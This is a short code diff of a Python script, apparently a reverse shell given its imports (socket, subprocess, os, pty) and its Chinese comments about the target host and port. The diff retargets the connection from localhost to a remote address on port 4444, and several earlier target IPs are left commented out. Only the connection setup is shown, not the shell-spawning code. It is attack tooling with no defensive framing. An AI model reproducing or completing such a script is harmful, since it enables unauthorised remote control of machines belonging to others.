@@ -3,8 +3,8 @@ import socket, subprocess, os, pty
 # host = "10.176.40.186"  # 目标主机的 IP 地址
 # host = "10.176.40.190"
 # host = "10.176.40.187"
-host = "127.0.0.1"
-port = 7778         # 目标主机的端口号
+host = "10.162.178.209"
+port = 4444         # 目标主机的端口号
 
 # 创建一个 TCP 套接字
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
